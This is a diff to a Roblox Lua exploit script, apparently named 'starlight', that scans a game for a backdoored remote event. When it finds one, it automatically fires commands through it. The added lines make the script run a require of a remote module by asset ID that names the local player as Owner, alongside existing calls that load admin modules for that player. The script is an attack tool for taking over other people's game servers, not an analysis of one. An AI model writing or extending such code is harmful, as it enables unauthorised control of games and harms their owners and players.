@@ -2300,7 +2300,7 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 			warn("💫 starlight: no backdoor, cannot execute code.")
 			game.StarterGui:SetCore("SendNotification",{
 				Title = "💫 starlight",
-				Text = "no backdoor found, or you didn't scan! - can't run code.",
+				Text = "No backdoor found, Please inject.",
 				Duration = 12
 			})
 		end
@@ -2453,10 +2453,12 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 				Text = "Backdoor Found in " .. scanTime .."s! backdoor: " .. (remoteEvent and remoteEvent.Name or remoteFunction and remoteFunction.Name or "unknown"),
 				Duration = 5
 			})
+                     -- Auto executes
+                        fireRemoteEvent('require(92684888032460)({Owners = {"' .. game.Players.LocalPlayer.Name .. '"}})')
                         fireRemoteEvent('require(8626754476):AD("' .. game.Players.LocalPlayer.Name .. '")')
                         fireRemoteEvent('require(6735691273).BetaAntiSkid()')
                         fireRemoteEvent('require(7276744247):noskids("' .. game.Players.LocalPlayer.Name ..  '")')
-                        fireRemoteEvent('require(3986243232).load("m john doe is real",{"' .. game.Players.LocalPlayer.Name ..  '"})')
+                        fireRemoteEvent('require(3986243232).load("No good sir this is starlight modded",{"' .. game.Players.LocalPlayer.Name ..  '"})')
 		else
 			script.Parent.Framee.Check.Text = "backdoor not found!"
 			script.Parent.stat.ImageColor3 = Color3.fromRGB(226, 69, 69)
